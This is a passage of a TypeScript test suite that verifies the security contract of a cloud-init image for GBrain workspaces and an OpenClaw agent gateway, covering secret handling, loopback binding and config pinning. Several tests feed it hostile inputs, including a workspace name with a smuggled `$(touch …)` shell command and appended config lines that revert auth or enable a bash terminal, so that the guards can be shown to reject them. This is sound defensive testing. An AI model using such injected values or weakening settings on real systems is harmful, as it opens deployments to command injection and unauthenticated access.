      'Brain-tier cloud-init must prove the agent service is disabled and inactive',
      'Brain-tier cloud-init must prove openclaw cannot read Platform Credentials',
      'Brain-tier cloud-init must prove openclaw belongs only to the openclaw group',
      'Brain-tier cloud-init must verify bounded OpenClaw storage',
      'Brain-tier cloud-init must verify direct PostgreSQL denial',
    ]);
  });

  test('the pinned-span structural allow-list keeps its shape', () => {
    // The span authorizes structural lines beyond the proofs: the two anchors,
    // the fatal diagnostics, and the block terminators. Pin the count so a new
    // structural exemption is a deliberate edit rather than a silent widening of
    // what the span tolerates.
    expect(PROOF_SPAN_STRUCTURE.length).toBe(6);
    expect(PROOF_SPAN_STRUCTURE.every(pattern => pattern instanceof RegExp)).toBe(true);
  });

  test('the Brain-tier prohibition table is pinned to exactly the messages proven above', () => {
    // This does not measure coverage; it pins the table's contents and order, so
    // adding, removing, or reordering a prohibition is a deliberate edit here
    // paired with the mutation above that proves it rejects the thing it names.
    expect(BRAIN_TIER_AGENT_PROHIBITIONS.map(({ message }) => message)).toEqual([
      'Brain-tier cloud-init must never re-activate gbrain-agent.service',
      'Brain-tier cloud-init must never install gbrain-agent.service into a systemd target',
      'Brain-tier cloud-init must not create or require the agent-scoped environment',
      'Brain-tier cloud-init must not configure Agent gateway auth or the GBrain bridge',
      'Brain-tier cloud-init must never disable shell error exits',
      'Brain-tier cloud-init must never wrap the agent proofs in a constant condition',
      'Brain-tier cloud-init must never add openclaw to another group',
      'Brain-tier cloud-init must never shadow systemctl with a shell function',
    ]);
  });

  test('the verifier accepts a comment that merely names agent enablement', async () => {
    // Fail-closed is not licence to fail loudly on prose: #57 will reference
    // enablement in comments, and a guard that cannot tell code from a comment
    // would break that build for no security gain.
    await withFinalizerMutations(async (root, finalizerPath, finalizer) => {
      await writeFile(
        finalizerPath,
        finalizer.replace(
          'systemctl daemon-reload',
          '# systemctl enable --now gbrain-agent.service is #57 work, never Brain-tier\n'
            + 'systemctl daemon-reload',
        ),
      );

      expect((await verifyImageBundle(root)).errors).toEqual([]);
    });
  });

  test('the verifier fails closed when cloud-init drops a required secret', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const cloudInitPath = join(root, 'cloud-init.example.yaml');
      const cloudInit = await readFile(cloudInitPath, 'utf8');
      await writeFile(
        cloudInitPath,
        cloudInit.replace(/^\s*GBRAIN_WORKSPACE_TOKEN_SECRET=.*$/m, ''),
      );

      const report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'cloud-init.example.yaml does not declare GBRAIN_WORKSPACE_TOKEN_SECRET',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the verifier fails closed when pgvector falls out of the image', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const provisionPath = join(root, 'scripts', 'provision.sh');
      const provision = await readFile(provisionPath, 'utf8');
      await writeFile(
        provisionPath,
        provision.replace(/^\s*"postgresql-\$\{POSTGRES_MAJOR\}-pgvector"$/m, ''),
      );

      const report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'provision.sh must install PostgreSQL with pgvector',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the deployer can validate concrete cloud-init input before launch', async () => {
    const result = await validateCloudInitEnvironment(validCloudInitEnvironment);

    expect(result).toEqual({
      exitCode: 0,
      stdout: '2Brain cloud-init contract: OK\n',
      stderr: '',
    });
  }, 15_000);

  test('cloud-init validation rejects a world-readable secret file', async () => {
    const result = await validateCloudInitEnvironment(
      validCloudInitEnvironment,
      0o604,
    );

    expect(result.exitCode).toBe(2);
    expect(result.stderr).toContain(
      'must not be readable by unprivileged users',
    );
  }, 15_000);

  test('cloud-init validation never evaluates user-derived values as shell', async () => {
    const sentinel = '/tmp/gbrain-cloud-init-injection-test';
    const maliciousEnvironment = validCloudInitEnvironment.replace(
      'GBRAIN_WORKSPACE_NAME="Acme Example Workspace"',
      `GBRAIN_WORKSPACE_NAME="Acme Example $(touch ${sentinel})"`,
    );

    const result = await validateCloudInitEnvironment(
      maliciousEnvironment,
      0o600,
      sentinel,
    );
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toBe('2Brain cloud-init contract: OK\n');
  }, 15_000);

  /**
   * The control plane renders `workspace.env`; the image's finalizer validates
   * it against a CLOSED allow-list and exits 2 on any key it does not know.
   * Those two lists live in different files, in different suites, and nothing
   * compared them — so #58's `GBRAIN_AGENT_TIER` shipped as a key the image
   * refuses, and every agent-tier VM died in cloud-init before GBrain or Caddy
   * ever started. This test is the missing joint: whatever the renderer can
   * emit, the finalizer must accept.
   */
  test('the finalizer accepts every key the agent-tier renderer emits', async () => {
    const rendered = renderCloudInit({
      name: 'Acme Example Workspace',
      subdomain: 'acme-example.workspaces.example.com',
      tier: 'agent',
      secrets: {
        postgresPassword: 'password-example',
        tokenSecret: 'token-secret-example',
        bootstrapCredential: 'bootstrap-credential-example',
      },
      resendApiKey: 'resend-key-example',
      emailFrom: '2Brain <no-reply@workspaces.example.com>',
      openrouterKey: 'sk-or-v1-example',
    });
    const body = /content: \|\n([\s\S]*?)\n\nruncmd:/.exec(rendered);
    expect(body, 'no workspace.env body in the rendered cloud-init').not.toBeNull();
    const environment = body![1]
      .split('\n')
      .map(line => line.replace(/^ {6}/, ''))
      .join('\n');
    expect(environment).toContain('GBRAIN_AGENT_TIER=true');

    const result = await validateCloudInitEnvironment(environment);

    expect(result.stderr).toBe('');
    expect(result.exitCode).toBe(0);
  }, 15_000);
});

describe('agent-tier finalizer contract (#57)', () => {
  let agentFinalizer: string;
  /**
   * The finalizer with whole-line comments removed. Prohibition checks read
   * THIS: a `not.toContain` over the raw text turns prose that documents a
   * banned construct ("never set a `dangerously*` key here") into a failure
   * whose message claims the script sets one. The teeth stay, the trap goes.
   */
  let agentCode: string;
  let brainFinalizer: string;
  let provision: string;
  let agentUnit: string;

  /** Body of the `cat >… <<EOF … EOF` heredoc that renders a Caddyfile. */
  function caddyfileHeredoc(source: string, target: string): string {
    const body = new RegExp(String.raw`cat >${target} <<EOF\n([\s\S]*?)\nEOF\n`).exec(source);
    expect(body, `no Caddyfile heredoc writing ${target}`).not.toBeNull();
    return body![1];
  }

  beforeAll(async () => {
    // Normalized to LF like every other finalizer read in this file: the
    // multiline fail-closed assertions below are `\n`-anchored, and under a CRLF
    // checkout they would fail for the wrong reason — or, worse, a future
    // `\r?\n` relaxation would silently weaken them.
    agentFinalizer = (
      await readFile(join(imageRoot, 'files', 'bin', 'gbrain-agent-finalize'), 'utf8')
    ).replace(/\r\n/g, '\n');
    agentCode = agentFinalizer
      .split('\n')
      .filter(line => !line.trimStart().startsWith('#'))
      .join('\n');
    brainFinalizer = (
      await readFile(join(imageRoot, 'files', 'bin', 'gbrain-cloud-init-finalize'), 'utf8')
    ).replace(/\r\n/g, '\n');
    provision = await readFile(join(imageRoot, 'scripts', 'provision.sh'), 'utf8');
    agentUnit = await readFile(
      join(imageRoot, 'files', 'systemd', 'gbrain-agent.service'),
      'utf8',
    );
  });

  test('provision.sh installs the agent finalizer beside the brain finalizer', () => {
    expect(provision).toContain(
      'install -m 0755 "$IMAGE_FILES/bin/gbrain-agent-finalize" /usr/local/sbin/gbrain-agent-finalize',
    );
  });

  test('the agent-scoped environment carries the marker and nothing else (#68)', () => {
    // #68 removed the generated Gateway token: trusted-proxy auth replaced it,
    // and `gateway.auth.token` is mutually exclusive with that mode. What
    // remains is the unit's ConditionPathExists target, which is what keeps an
    // accidentally enabled unit inert on Brain tier — so the file must still be
    // written, atomically, and must hold no credential of any class.
    expect(agentFinalizer).toContain(`printf '${AGENT_ENV_MARKER}\\n' >/etc/openclaw/agent.env.tmp`);
    expect(agentFinalizer).toContain('chmod 0640 /etc/openclaw/agent.env.tmp');
    expect(agentFinalizer).toContain('mv /etc/openclaw/agent.env.tmp /etc/openclaw/agent.env');
    // Structural rather than a `not.toContain` pair: every write to the env
    // file is enumerated, so a SECOND write appending a credential after the
    // marker fails here even though the pinned marker line is still present.
    const envWrites = agentCode
      .split('\n')
      .filter(line => /\b(?:printf|echo|cat|tee)\b[^\n]*\/etc\/openclaw\/agent\.env/.test(line));
    expect(envWrites).toEqual([
      `printf '${AGENT_ENV_MARKER}\\n' >/etc/openclaw/agent.env.tmp`,
    ]);
    for (const credentialClass of ['OPENCLAW_GATEWAY_TOKEN', 'openssl rand', 'PASSWORD']) {
      expect(
        agentFinalizer.includes(credentialClass),
        `agent finalization must not mint or install ${credentialClass}`,
      ).toBe(false);
    }
  });

  test('the marker file is never world-readable, and is installed atomically', () => {
    // Same discipline the token file needed: the temporary carries its final
    // root:openclaw 0640 ownership and mode BEFORE any byte lands, and the
    // rename is what publishes it. The marker is not secret, but a partially
    // written file that already satisfies ConditionPathExists is a unit that
    // starts against an environment the finalizer had not finished writing.
    const preCreate = agentFinalizer.indexOf(
      'install -m 0640 -o root -g openclaw /dev/null /etc/openclaw/agent.env.tmp',
    );
    const writesMarker = agentFinalizer.indexOf(`printf '${AGENT_ENV_MARKER}\\n'`);
    expect(preCreate).toBeGreaterThan(-1);
    expect(writesMarker).toBeGreaterThan(-1);
    expect(preCreate).toBeLessThan(writesMarker);
    expect(agentFinalizer).toContain(`trap 'rm -f /etc/openclaw/agent.env.tmp' EXIT`);
  });

  test('the agent unit still conditions on the marker the Brain tier may not create', () => {
    // The inertness boundary between the tiers is exactly this pair: this
    // script is the only one allowed to create the path, and the unit refuses
    // to start without it. Removing either half silently enables the agent on a
    // Brain-tier VM. `BRAIN_TIER_AGENT_PROHIBITIONS` owns the other half.
    expect(agentUnit).toContain('ConditionPathExists=/etc/openclaw/agent.env');
    expect(agentUnit).toContain('EnvironmentFile=/etc/openclaw/agent.env');
  });

  test('the bridge plugin is installed root-owned, outside anything openclaw may write', () => {
    expect(provision).toContain(
      'install -d -m 0755 -o root -g root /usr/local/share/openclaw/gbrain-agent-bridge',
    );
    expect(provision).toContain(`for bridge_file in ${AGENT_BRIDGE_FILES.join(' ')}; do`);
    expect(provision).toMatch(
      /install -m 0644 -o root -g root[\s\\\n]+"\$IMAGE_FILES\/openclaw\/gbrain-agent-bridge\/\$bridge_file"/,
    );
    // Never chowned to openclaw, and never placed under a path the unit's
    // ReadWritePaths grants: a bridge the agent can rewrite is a
    // credential-import route the agent owns.
    // The PARENT too. Write permission on /usr/local/share/openclaw alone lets
    // the agent identity `mv` the bridge aside and substitute its own
    // credential-import route, which the child directory's mode cannot prevent.
    expect(provision).toContain('install -d -m 0755 -o root -g root /usr/local/share/openclaw\n');
    // And the modes must be re-asserted, the way the /opt runtime trees are: a
    // single trailing `chmod -R a+w` would undo every `install` above while the
    // plugin still loads, so nothing else in this suite would notice.
    expect(provision).toContain('chown -R root:root /usr/local/share/openclaw\n');
    expect(provision).toContain('chmod -R go-w /usr/local/share/openclaw\n');
    // Allow-shaped: every ownership/permission statement naming the path is
    // enumerated, so an ADDED one fails rather than passing unseen.
    const permissionStatements = provision
      .split('\n')
      .map(line => line.trim())
      .filter(line => !line.startsWith('#'))
      .filter(line => /\b(?:chmod|chown|chgrp|setfacl)\b/.test(line))
      .filter(line => line.includes('/usr/local/share/openclaw'));
    expect(permissionStatements).toEqual([
      'chown -R root:root /usr/local/share/openclaw',
      'chmod -R go-w /usr/local/share/openclaw',
    ]);
    expect(provision).not.toMatch(/chown[^\n]*openclaw[^\n]*gbrain-agent-bridge/);
    expect(agentUnit).not.toContain('/usr/local/share/openclaw');
    const readWritePaths = parseUnitDirectives(agentUnit)
      .filter(({ key }) => key === 'ReadWritePaths')
      .flatMap(({ value }) => value.split(/\s+/));
    for (const path of readWritePaths) {
      expect(
        '/usr/local/share/openclaw/gbrain-agent-bridge'.startsWith(path),
        `ReadWritePaths=${path} would let the agent rewrite its own bridge plugin`,
      ).toBe(false);
    }
  });

  test('only the subdomain crosses from the Workspace environment — never a secret', () => {
    // `-m 1` in place of a `head -n 1` stage, and `|| true` so a no-match grep
    // (exit 1, fatal under pipefail) cannot abort the assignment before the
    // missing-subdomain diagnostic below can print.
    expect(agentFinalizer).toContain(
      `GBRAIN_SUBDOMAIN="$(grep -m 1 -E '^GBRAIN_SUBDOMAIN=' "$ENV_FILE" | cut -d= -f2- || true)"`,
    );
    // Comment-stripped: the script documents WHY it avoids `head -n 1`.
    expect(agentCode).not.toContain('head -n 1');
    // Sourcing the whole env file would hand every Platform Credential to this
    // script's expansions; the grep above is the only allowed read.
    expect(agentFinalizer).not.toMatch(/(^|\s)(source|\.)\s+["']?\/etc\/gbrain\/workspace\.env/m);
    for (const secret of ['BOOTSTRAP_CREDENTIAL', 'OPENROUTER_API_KEY', 'DATABASE_URL', 'RESEND']) {
      expect(agentFinalizer).not.toContain(secret);
    }
    // GBRAIN_WORKSPACE_TOKEN_SECRET is the one narrow exception (#68): the
    // script must PROVE it exists, because the shared native password derives
    // from it and a value that appears or changes later closes native ingress
    // forever. Naming a key is not reading a value, so the ban is replaced by a
    // precise rule rather than lifted:
    //   - it may be COUNTED with `grep -c`, which prints only a number;
    //   - it may never be assigned to a variable, captured in a substitution,
    //     printed, or passed to another command.
    const tokenSecretUses = agentCode.split('\n').filter(line => line.includes('TOKEN_SECRET'));
    expect(tokenSecretUses.length).toBeGreaterThan(0);
    for (const line of tokenSecretUses) {
      expect(
        /grep -c -E '\^GBRAIN_WORKSPACE_TOKEN_SECRET=\[\^\[:space:\]\]'/.test(line)
        || /^\s*echo "agent finalize requires GBRAIN_WORKSPACE_TOKEN_SECRET/.test(line),
        `gbrain-agent-finalize may only count GBRAIN_WORKSPACE_TOKEN_SECRET, never read it: ${line.trim()}`,
      ).toBe(true);
    }
    // Belt and braces on the two shapes that would read the VALUE.
    expect(agentCode).not.toMatch(/cut[^\n]*TOKEN_SECRET/);
    expect(agentCode).not.toMatch(/TOKEN_SECRET[^\n]*\|\s*cut/);
    expect(agentCode).not.toMatch(/\$\{?GBRAIN_WORKSPACE_TOKEN_SECRET\}?/);
  });

  const BIND_LINE = /^openclaw_config_set gateway\.bind loopback$/m;

  /**
   * The gateway refuses to start against a config with no `gateway.mode`: it
   * reads the absence as a clobbered config and blocks. The finalizer wrote
   * every other gateway key and not this one, so OpenClaw exited 1 on every
   * start. `--allow-unconfigured` would suppress the check instead of
   * satisfying it, which is why the escape-hatch assertion below stays.
   */
  test('the finalizer declares the gateway mode the pinned release demands', () => {
    expect(agentFinalizer).toMatch(/^openclaw_config_set gateway\.mode local$/m);
    expect(agentCode).not.toContain('--allow-unconfigured');
  });

  test('the finalizer writes EXACTLY the reviewed OpenClaw configuration', () => {
    // The headline fail-open this whole task exists to close: a per-line
    // `toContain` cannot see an appended `openclaw_config_set gateway.auth.mode
    // token`, which leaves every pinned line intact and reverts the auth model,
    // because `config set` is last-writer-wins. So the finalizer is PARSED into
    // (key, value) pairs and compared as a whole map with per-key cardinality.
    const assignments = parseOpenclawConfigSets(agentFinalizer);
    expect(Object.fromEntries(assignments)).toEqual({ ...AGENT_GATEWAY_CONFIG });
    expect(assignments.map(([key]) => key).sort()).toEqual(Object.keys(AGENT_GATEWAY_CONFIG).sort());
    // The two settings the deployment investigation found actually broken.
    expect(AGENT_GATEWAY_CONFIG['gateway.auth.mode']).toBe('trusted-proxy');
    expect(AGENT_GATEWAY_CONFIG['plugins.entries.admin-http-rpc.enabled']).toBe('true');
  });

  test('mutation probe: an APPENDED assignment is rejected, not just a changed one', () => {
    const reverted = `${agentFinalizer}\nopenclaw_config_set gateway.auth.mode token\n`;
    expect(Object.fromEntries(parseOpenclawConfigSets(reverted))).not.toEqual({
      ...AGENT_GATEWAY_CONFIG,
    });
    const extra = `${agentFinalizer}\nopenclaw_config_set gateway.terminal.shell /bin/bash\n`;
    expect(parseOpenclawConfigSets(extra).map(([key]) => key)).toContain('gateway.terminal.shell');
  });

  test('every key the finalizer writes is also read back from the effective config', () => {
    // Derived from AGENT_GATEWAY_CONFIG rather than hand-listed. A hand-listed
    // probe set is how `gateway.reload.mode` shipped written-but-unverified: it
    // is load-bearing (the auth-generation reload it triggers restarts the
    // Gateway after a password patch and disconnects already established native
    // WebSocket clients), and nothing tied the write list to the read-back list.
    const unverified = Object.keys(AGENT_GATEWAY_CONFIG).filter(
      key => !agentCode.includes(`'${key}'`),
    );
    expect(unverified, 'these keys are written but never read back').toEqual([]);
    // The load-bearing one, named explicitly so its removal reads as deliberate.
    expect(agentCode).toContain("expectValue('gateway.reload.mode', 'hybrid')");
  });

  test('the effective-config probe actually RUNS, and decides both ways', async () => {
    // Every other assertion about this probe reads its TEXT. That is how a real
    // agent VM shipped a probe that could not execute at all: the finalizer
    // wrote it to a bare `mktemp` name, and because the probe is ESM, node
    // rejected /tmp/tmp.3hP5VZlFss with ERR_UNKNOWN_FILE_EXTENSION before
    // running a line. The script could not tell that apart from a genuine
    // contract violation, so it exited 2 with "the effective OpenClaw
    // configuration does not match the 2Brain agent contract" on a VM whose
    // config was perfect — skipping every live route probe after it.
    //
    // So this test EXECUTES the probe: once against a conforming config, which
    // must pass, and once per violation, which must each fail. A probe that
    // cannot run, or that passes everything, fails here.
    const probeBody = /cat >"\$agent_config_probe" <<'PROBE'\n([\s\S]*?)\nPROBE\n/.exec(
      agentFinalizer,
    );
    expect(probeBody, 'no PROBE heredoc in gbrain-agent-finalize').not.toBeNull();

    // The extension is the whole bug: node picks module format from it.
    expect(
      agentFinalizer,
      'the probe file must be created with a node-loadable extension',
    ).toContain('mktemp --suffix=.mjs');

    const dir = await mkdtemp(join(tmpdir(), 'agent-probe-'));
    const probePath = join(dir, 'probe.mjs');
    await writeFile(probePath, probeBody![1], 'utf8');

    const conforming = {
      gateway: {
        mode: 'local',
        bind: 'loopback',
        port: 3334,
        auth: {
          mode: 'trusted-proxy',
          trustedProxy: {
            userHeader: 'X-GBrain-OpenClaw-User',
            requiredHeaders: ['X-GBrain-OpenClaw-Proxy'],
            allowLoopback: true,
          },
        },
        reload: { mode: 'hybrid' },
        terminal: { enabled: false },
        http: {
          endpoints: {
            responses: { enabled: true, files: { allowUrl: false }, images: { allowUrl: false } },
          },
        },
        controlUi: { basePath: '/agent', allowedOrigins: ['https://ws.example.test'] },
        trustedProxies: ['127.0.0.1'],
      },
      agents: {
        defaults: {
          model: { primary: 'openai/gpt-5.6-sol', fallbacks: ['anthropic/claude-sonnet-5'] },
          models: { 'openai/*': {}, 'anthropic/*': {}, 'openrouter/*': {} },
        },
      },
      models: { providers: { openai: { agentRuntime: { id: 'openclaw' } } } },
      plugins: {
        load: { paths: ['/usr/local/share/openclaw/gbrain-agent-bridge'] },
        entries: {
          'gbrain-agent-bridge': { enabled: true },
          'admin-http-rpc': { enabled: true },
        },
      },
    };

    const runProbe = async (config: unknown): Promise<number> => {
      const configPath = join(dir, `config-${Math.random().toString(36).slice(2)}.json`);
      await writeFile(configPath, JSON.stringify(config), 'utf8');
      const proc = Bun.spawn(['node', probePath, configPath], { stdout: 'pipe', stderr: 'pipe' });
      return await proc.exited;
    };

    // A conforming config must PASS. If this fails the probe cannot run at all,
    // which is exactly the shipped defect.
    expect(await runProbe(conforming), 'conforming config must satisfy the probe').toBe(0);

    // Each violation must FAIL on its own, so a probe that passes everything —
    // or that stops checking a key — cannot hide behind the others.
    const clone = (): typeof conforming => structuredClone(conforming);
    const violations: Array<[string, () => typeof conforming]> = [
      ['auth mode reverted to token', () => {
        const c = clone(); c.gateway.auth.mode = 'token'; return c;
      }],
      ['the OpenAI runtime pin removed', () => {
        const c = clone(); c.models.providers.openai.agentRuntime.id = 'auto'; return c;
      }],
      ['the web terminal enabled', () => {
        const c = clone(); c.gateway.terminal.enabled = true; return c;
      }],
      ['a wildcard control-UI origin', () => {
        const c = clone(); c.gateway.controlUi.allowedOrigins = ['*']; return c;
      }],
      ['a second control-UI origin', () => {
        const c = clone();
        c.gateway.controlUi.allowedOrigins = ['https://ws.example.test', 'https://evil.test'];
        return c;
      }],
      ['the admin RPC plugin disabled', () => {
        const c = clone(); c.plugins.entries['admin-http-rpc'].enabled = false; return c;
      }],
      ['Responses URL fetching re-enabled', () => {
        const c = clone(); c.gateway.http.endpoints.responses.files.allowUrl = true; return c;
      }],
      ['the reload mode reverted', () => {
        const c = clone(); c.gateway.reload.mode = 'manual'; return c;
      }],
    ];
    for (const [label, build] of violations) {
      expect(await runProbe(build()), `probe must reject: ${label}`).not.toBe(0);
    }

    await rm(dir, { recursive: true, force: true });
  });

  test('the tool policy check is allow-shaped, so a wildcard deny cannot pass', () => {
    // A deny-shaped guard that rejects entries NAMING the GBrain tools leaves
    // every matcher syntax open: `["*"]` and `["mcp__*"]` hide the projection
    // while naming nothing. The probe therefore requires each deny entry to be
    // an exact tool id, and refuses anything else on sight.
    expect(agentCode).toContain('const EXACT_TOOL_ID = /^(?:group:)?[a-z0-9_-]+$/;');
    expect(agentCode).toContain('!EXACT_TOOL_ID.test(entry)');
    expect(agentCode).toContain('/bundle-mcp|gbrain/.test(entry)');
    // Executed, not read: the guard is JavaScript, so the mutation matrix below
    // runs it against the entries that must be refused and the ones that must
    // not. A regex assertion alone would not prove which way it decides.
    const guard = (deny: unknown): boolean => {
      const EXACT_TOOL_ID = /^(?:group:)?[a-z0-9_-]+$/;
      if (!Array.isArray(deny)) return true;
      return deny.some(
        entry =>
          typeof entry !== 'string'
          || !EXACT_TOOL_ID.test(entry)
          || /bundle-mcp|gbrain/.test(entry),
      );
    };
    for (const refused of [
      ['*'],
      ['mcp__*'],
      ['gbrain__*'],
      ['bundle-mcp'],
      ['gbrain__whoami'],
      ['group:*'],
      ['**'],
      ['BUNDLE-MCP'],
      ['/gbrain/'],
      [42],
      ['mcp__gbrain__whoami'],
    ]) {
      expect(guard(refused), `tools.deny ${JSON.stringify(refused)} must be refused`).toBe(true);
    }
    // Unrelated, exact denials stay legal — the rule is about hiding the MCP
    // projection, not about forbidding tool policy outright.
    for (const permitted of [[], ['exec'], ['group:runtime'], ['web_search', 'browser']]) {
      expect(guard(permitted), `tools.deny ${JSON.stringify(permitted)} must be permitted`).toBe(false);
    }
  });

  test('the projected-MCP-tool proof is explicitly deferred, not silently skipped', () => {
    // Steps 5 and 6 ask finalization to live-probe the projected tool. It
    // cannot: the projection needs a configured GBrain MCP server, a Workspace
    // tenant, and an Agent row with a credential, and none of the three exists
    // at image-finalize time. The deferral must therefore be recorded in the
    // script itself, naming where the end-to-end proof really happens, so a
    // future reader does not mistake the static policy check for that proof.
    const deferral = agentFinalizer
      .split('\n')
      .filter(line => line.trimStart().startsWith('//'))
      .join('\n');
    expect(deferral).toContain('NOT a live probe of the projected tool');
    expect(deferral).toMatch(/Task 14/);
  });

  test('config is written only through the reviewed top-level wrapper', () => {
    // `parseOpenclawConfigSets` reads the top-level view, which blanks EVERY
    // function body — called or not — so an assignment inside a helper the
    // script really invokes, or a raw `openclaw_run config set`, would be
    // invisible to the exact-set check. Both forms are banned outright instead.
    const codeLines = agentCode
      .split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0);
    const invocations = codeLines.filter(line => /^openclaw_config_set[ \t]+[^ \t]/.test(line));
    expect(invocations.length).toBe(parseOpenclawConfigSets(agentFinalizer).length);
    expect(codeLines.filter(line => /openclaw_run[ \t]+config[ \t]+set\b/.test(line))).toEqual([
      'openclaw_run config set "$@"',
    ]);
  });

  test('the gateway stays private: loopback bind, /agent base path, loopback upstreams', () => {
    expect(agentFinalizer).toMatch(BIND_LINE);
    expect(agentFinalizer).toMatch(/^openclaw_config_set gateway\.port 3334$/m);
    expect(agentFinalizer).toMatch(/^openclaw_config_set gateway\.controlUi\.basePath \/agent$/m);
    expect(agentFinalizer).toContain('gateway.controlUi.allowedOrigins');
    expect(agentFinalizer).toContain('gateway.trustedProxies');
    // `sudo -u openclaw VAR=val …` is subject to sudo's env_reset/setenv policy;
    // routing the agent-scoped environment through `env` is unconditional.
    expect(agentFinalizer).toContain('sudo -u openclaw env');
    // Every proxy upstream in the rewritten Caddyfile is loopback.
    const upstreams = agentFinalizer.match(/reverse_proxy \S+/g) ?? [];
    expect(upstreams.length).toBeGreaterThanOrEqual(2);
    for (const upstream of upstreams) expect(upstream).toMatch(/^reverse_proxy 127\.0\.0\.1:\d+$/);
    // Comment-stripped: prose warning against a public bind must not read as one.
    expect(agentCode).not.toContain('0.0.0.0');
  });

  test('the required proxy header is documented as a marker, never as a secret', () => {
    // `requiredHeaders` is a PRESENCE check in openclaw@2026.7.1-2 — the value
    // is never compared. Copy that calls it a secret would license removing the
    // loopback bind or the Caddy header strip that actually bound this surface.
    const proxyHeaderProse = agentFinalizer
      .split('\n')
      .filter(line => line.trimStart().startsWith('#'))
      .filter(line => /requiredHeaders|X-GBrain-OpenClaw-Proxy/.test(line))
      .join('\n');
    expect(proxyHeaderProse).toContain('PRESENCE check');
    expect(proxyHeaderProse).toMatch(/NOT a shared secret/);
  });

  test('the finalizer proves the runtime works rather than only configuring it', () => {
    // Every assertion above is about a WRITE. These are the live probes that
    // make a misspelled key, an undiscovered plugin, a moved SDK subpath, or a
    // route registered under different auth fail on the VM instead of on first
    // customer use. Each is a substring check of a shell command, which is the
    // only form available for a script that must stay standalone bash.
    for (const probe of [
      'openclaw_run config validate',
      "await import('openclaw/plugin-sdk/provider-auth')",
      'openclaw_run plugins inspect gbrain-agent-bridge --runtime --json',
      'openclaw_run plugins list --enabled',
      'http://127.0.0.1:3334/api/v1/gbrain/provider',
      'http://127.0.0.1:3334/api/v1/admin/rpc',
    ]) {
      expect(agentCode, `agent finalization must live-probe ${probe}`).toContain(probe);
    }
    // Each probe must also ABORT. A URL that merely appears proves nothing: a
    // captured status nobody compares, or a guard whose `exit 2` was deleted,
    // leaves every pinned string intact and finalization reporting success.
    for (const condition of [
      String.raw`\[\[ "\$bridge_status" != "400" \]\]`,
      // The positive route probe alone would pass against `auth: none`, so the
      // unauthenticated call must be proven REFUSED.
      String.raw`\[\[ ! "\$unauthenticated_status" =~ \^\(401\|403\)\$ \]\]`,
      // And a 404 on the bundled admin route — the exact defect this task fixes
      // — is fatal rather than merely "some HTTP status".
      String.raw`\[\[ ! "\$admin_rpc_status" =~ \^\[1-5\]\[0-9\]\[0-9\]\$ \]\] \|\| \[\[ "\$admin_rpc_status" == "404" \]\]`,
    ]) {
      expect(agentFinalizer, `no aborting guard for ${condition}`).toMatch(failsClosed(condition));
    }
    // And each guard's status really comes from its own request.
    for (const [variable, url] of [
      ['bridge_status', '/api/v1/gbrain/provider'],
      ['unauthenticated_status', '/api/v1/gbrain/provider'],
      ['admin_rpc_status', '/api/v1/admin/rpc'],
    ]) {
      expect(agentCode, `${variable} must be captured from ${url}`).toMatch(
        // `^`-anchored: without it `unused_bridge_status="$(curl …` still
        // contains `bridge_status="$(curl …`, so renaming the capture away from
        // the variable its guard reads would pass while the guard compared an
        // empty string. That is the fail-open this repository keeps producing.
        new RegExp(String.raw`^${variable}="\$\(curl[\s\S]{0,400}?127\.0\.0\.1:3334${url.replace(/\//g, '\\/')}`, 'm'),
      );
    }
  });

  test('mutation probe: the bind assertion rejects a public bind', () => {
    const mutated = agentFinalizer.replace('gateway.bind loopback', 'gateway.bind 0.0.0.0');
    expect(BIND_LINE.test(mutated)).toBe(false);
  });

  test('the finalizer names the same base path and gateway port the control plane does', () => {
    // The readiness probe dials AGENT_BASE_PATH and nothing else ties it to this
    // script, which stays standalone bash and imports nothing. Without this tie,
    // renaming the base path on either side leaves the probe hitting a path the
    // gateway does not serve — which is exactly the fail-open the probe exists to
    // prevent, since GBrain answers an unknown path rather than nothing.
    expect(agentFinalizer).toMatch(
      new RegExp(String.raw`^openclaw_config_set gateway\.controlUi\.basePath ${AGENT_BASE_PATH}$`, 'm'),
    );
    expect(agentFinalizer).toContain(`@agentBrowser path ${AGENT_BASE_PATH} ${AGENT_BASE_PATH}/*`);
    // The native route is the same gateway surface under a second public prefix,
    // rewritten back onto the one basePath the gateway is configured with.
    expect(agentFinalizer).toContain(`@agentNative path ${AGENT_CLIENT_BASE_PATH} ${AGENT_CLIENT_BASE_PATH}/*`);
    expect(agentFinalizer).toContain(`uri replace ${AGENT_CLIENT_BASE_PATH} ${AGENT_BASE_PATH}`);
    // The gate GBrain answers for the control plane's readiness proof must reach
    // GBRAIN, not the gateway. A whole-file `toContain` asserted nothing here:
    // the string also appears in the closing echo, so the check passed on the
    // log line alone. The real contract is that the path falls OUTSIDE both
    // agent prefixes and therefore lands on the root handler.
    expect(AGENT_RUNTIME_HEALTH_PATH.startsWith(`${AGENT_BASE_PATH}/`)).toBe(false);
    expect(AGENT_RUNTIME_HEALTH_PATH).not.toBe(AGENT_BASE_PATH);
    expect(AGENT_RUNTIME_HEALTH_PATH.startsWith(`${AGENT_CLIENT_BASE_PATH}/`)).toBe(false);
    expect(AGENT_RUNTIME_HEALTH_PATH).not.toBe(AGENT_CLIENT_BASE_PATH);
    // And no agent handler may claim it: only the bare root `handle` serves it.
    const caddy = agentCaddyfile();
    for (const handler of ['handle @agentBrowser {', 'handle @agentNative {']) {
      expect(orderedBlock(caddy, handler)).not.toContain(AGENT_RUNTIME_HEALTH_PATH);
    }
    // The finalizer still names it for an operator reading a failed boot.
    expect(agentFinalizer).toContain(`https://\${GBRAIN_SUBDOMAIN}${AGENT_RUNTIME_HEALTH_PATH}`);
    expect(agentFinalizer).toMatch(new RegExp(String.raw`^openclaw_config_set gateway\.port ${AGENT_GATEWAY_PORT}$`, 'm'));
    expect(agentFinalizer).toContain(`reverse_proxy 127.0.0.1:${AGENT_GATEWAY_PORT}`);
    expect(agentFinalizer).toContain(`http://127.0.0.1:${AGENT_GATEWAY_PORT}${AGENT_BASE_PATH}`);
